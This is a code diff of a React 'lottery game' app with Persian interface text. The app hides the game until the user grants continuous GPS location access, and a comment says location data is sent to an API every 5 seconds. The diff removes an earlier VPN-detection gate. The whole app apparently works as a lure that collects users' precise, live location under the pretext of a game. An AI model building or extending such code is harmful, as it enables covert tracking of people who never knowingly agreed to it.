@@ -1,48 +1,15 @@
 import { useEffect, useState } from "react";
 import { Routes, Route } from "react-router-dom";
 
-import { useVPN } from "./hooks/useVPN";
 import { useLocation } from "./hooks/useLocation";
 import { useLocationAPI } from "./hooks/useLocationAPI";
 import LotteryGame from "./components/LotteryGame";
-import VPNDetection from "./components/VPNDetection";
 import LocationRequest from "./components/LocationRequest";
 import AdminLayout from "./components/AdminLayout";
 
-type AppState = "location-request" | "vpn-check" | "lottery-game";
-
 function App() {
-  const [appState, setAppState] = useState<AppState>("location-request");
   const [locationTips, setLocationTips] = useState<string[]>([]);
   const [isLoading, setIsLoading] = useState(true);
-
-  // Initialize hooks with error handling
-  let locationHook, vpnHook, locationAPI;
-
-  try {
-    locationHook = useLocation();
-    vpnHook = useVPN();
-    locationAPI = useLocationAPI(
-      locationHook.location,
-      locationHook.isWatching
-    );
-  } catch (error) {
-    console.error("Hook initialization error:", error);
-    return (
-      <div className="min-h-screen bg-red-900 flex items-center justify-center text-white">
-        <div className="text-center">
-          <h1 className="text-2xl font-bold mb-4">خطا در بارگذاری برنامه</h1>
-          <p>مشکلی در بارگذاری برنامه پیش آمده است.</p>
-          <button
-            onClick={() => window.location.reload()}
-            className="mt-4 px-4 py-2 bg-white text-red-900 rounded"
-          >
-            بارگذاری مجدد
-          </button>
-        </div>
-      </div>
-    );
-  }
 
   const {
     location,
@@ -52,14 +19,10 @@ function App() {
     hasPermission,
     isWatching,
     getLocationTips,
-  } = locationHook;
+  } = useLocation();
 
-  const {
-    vpnStatus,
-    checking: vpnChecking,
-    error: vpnError,
-    checkVPN,
-  } = vpnHook;
+  // Use the location API hook to send data every 5 seconds
+  const locationAPI = useLocationAPI(location, isWatching);
 
   // Set loading to false after hooks are initialized
   useEffect(() => {
@@ -103,40 +66,11 @@ function App() {
     loadLocationTips();
   }, [getLocationTips]);
 
-  // Handle app state transitions
-  useEffect(() => {
-    if (!hasPermission || !location || !isWatching) {
-      setAppState("location-request");
-    } else if (location && hasPermission) {
-      // Location granted, check VPN
-      if (vpnStatus === null) {
-        setAppState("vpn-check");
-      } else if (vpnStatus.isVPN) {
-        setAppState("vpn-check");
-      } else {
-        setAppState("lottery-game");
-      }
-    }
-  }, [hasPermission, location, isWatching, vpnStatus]);
-
   const handleLocationRequest = async () => {
     try {
       await requestLocation();
     } catch (error) {
       console.error("Error requesting location:", error);
-    }
-  };
-
-  const handleVPNCheck = async () => {
-    if (location) {
-      await checkVPN({
-        latitude: location.latitude,
-        longitude: location.longitude,
-        accuracy: location.accuracy,
-        isGPS: location.isGPS,
-      });
-    } else {
-      await checkVPN();
     }
   };
 
@@ -152,49 +86,33 @@ function App() {
     );
   }
 
-  // Render based on current state
+  // Render content based on location permission
   const renderContent = () => {
-    switch (appState) {
-      case "location-request":
-        return (
-          <LocationRequest
-            onRequestLocation={handleLocationRequest}
-            loading={locationLoading}
-            error={locationError}
-            locationTips={locationTips}
-          />
-        );
-
-      case "vpn-check":
-        return (
-          <VPNDetection
-            onVPNCheck={handleVPNCheck}
-            checking={vpnChecking}
-            isVPN={vpnStatus?.isVPN ?? null}
-            error={vpnError}
-          />
-        );
-
-      case "lottery-game":
-        return (
-          <LotteryGame
-            location={location}
-            locationData={vpnStatus?.locationData ?? {}}
-            isWatching={isWatching}
-            apiStatus={locationAPI}
-          />
-        );
-
-      default:
-        return (
-          <LocationRequest
-            onRequestLocation={handleLocationRequest}
-            loading={locationLoading}
-            error={locationError}
-            locationTips={locationTips}
-          />
-        );
+    if (!hasPermission || !location || !isWatching) {
+      return (
+        <LocationRequest
+          onRequestLocation={handleLocationRequest}
+          loading={locationLoading}
+          error={locationError}
+          locationTips={locationTips}
+        />
+      );
     }
+
+    // Show lottery game directly when location is available
+    return (
+      <LotteryGame
+        location={location}
+        locationData={{
+          latitude: location.latitude,
+          longitude: location.longitude,
+          accuracy: location.accuracy,
+          isGPS: location.isGPS,
+        }}
+        isWatching={isWatching}
+        apiStatus={locationAPI}
+      />
+    );
   };
 
   return (
